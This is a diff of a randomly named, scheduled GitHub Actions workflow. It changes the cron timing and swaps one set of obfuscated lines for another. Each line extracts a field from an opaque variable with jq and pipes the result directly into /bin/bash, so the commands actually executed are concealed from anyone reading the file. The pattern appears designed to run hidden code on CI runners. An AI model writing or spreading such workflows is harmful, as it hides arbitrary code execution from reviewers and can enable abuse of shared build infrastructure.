@@ -2,7 +2,7 @@ name: peixiayu6537
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 5/6 * * *'
+    - cron: '20 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,15 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: peixiayu6537
         env:
-          frg08002: ${{ secrets.frg08002 }}
+          t8: ${{ secrets.t8 }}
         run: |
-          echo $frg08002 | jq -r .r9678 | /bin/bash
-          echo $p9 | jq -r .qke1 | /bin/bash
-          echo $sr0 | jq -r .mp68 | /bin/bash
-          echo $bdpey6827 | jq -r .ks308 | /bin/bash
-          echo $wvvb71834 | jq -r .yfgo81407 | /bin/bash
-          echo $r93886 | jq -r .gshw3494 | /bin/bash
-          echo $rt12104 | jq -r .u05203 | /bin/bash
-          echo $zmtg0 | jq -r .djaa49 | /bin/bash
-          echo $xak6 | jq -r .ch28410 | /bin/bash
+          echo $t8 | jq -r .yk6 | /bin/bash
+          echo $vyth238 | jq -r .ydfz162 | /bin/bash
+          echo $cx80359 | jq -r .t4858 | /bin/bash
+          echo $xac21 | jq -r .rydl26 | /bin/bash
+          echo $ispgx36 | jq -r .jrftr1160 | /bin/bash
+          echo $fyugt421 | jq -r .pgdqv4 | /bin/bash
+          echo $qob86601 | jq -r .w018 | /bin/bash
+          echo $z842 | jq -r .xqb14348 | /bin/bash
 
